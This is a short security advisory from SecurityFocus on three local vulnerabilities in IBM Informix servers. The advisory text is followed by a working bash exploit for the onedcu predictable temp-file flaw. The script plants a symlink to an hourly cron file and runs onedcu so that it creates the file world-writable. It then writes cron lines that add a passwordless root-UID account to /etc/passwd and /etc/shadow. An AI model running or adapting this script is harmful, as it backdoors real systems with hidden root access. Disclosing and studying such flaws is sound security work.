source: http://www.securityfocus.com/bid/9512/info

IBM Informix Dynamic Server and IBM Informix Extended Parallel Server have been reported prone to multiple vulnerabilities.

The first issue exists in the onedcu binary. Specifically, when the binary is invoked a predictable temporary file is created. A local attacker may exploit this issue to launch symbolic link style attacks ultimately resulting in elevated privileges.

The second issue that has been reported to exist in the ontape binary. The ontape binary has been reported to be prone to a local stack based buffer overflow vulnerability. Ultimately the attacker may exploit this condition to influence execution flow of the vulnerable binary into attacker-controlled memory. This may lead to the execution of arbitrary instructions with elevated privileges.

A third issue has been reported to affect the onshowaudit binary. Specifically, the onshowaudit binary reads data from temporary files contained in the "tmp? directory. These files have predictable filenames; an attacker may exploit this issue to disclose data that may be used in further attacks launched against the vulnerable system. 

#!/bin/bash

ONEDCU=/home/informix-9.40/bin/onedcu
CRONFILE=/etc/cron.hourly/pakito
USER=pakito
DIR=./trash

export INFORMIXDIR=/home/informix-9.40/
export ONCONFIG=onconfig.std

        if [ -d $DIR ]; then
                echo Trash directory already created
        else
                mkdir $DIR
        fi

cd $DIR
        if [ -f ./"\001" ]; then
                echo Link Already Created
        else
                ln -s $CRONFILE `echo -e "\001"`
        fi

umask 000
$ONEDCU &
kill -9 `pidof $ONEDCU`


echo "echo "#!/bin/bash"" > $CRONFILE
echo "echo "$USER:x:0:0::/:/bin/bash" >> /etc/passwd" >> $CRONFILE
echo "echo "$USER::12032:0:99999:7:::" >> /etc/shadow" >> $CRONFILE
echo " "
echo "  This vulnerability was researched by Juan Manuel Pascual Escriba"
echo "  08/08/2003 Barcelona - Spain pask@
3s.com
echo " "
echo "  must wait until cron execute $CRONFILE and then exec su pakito"
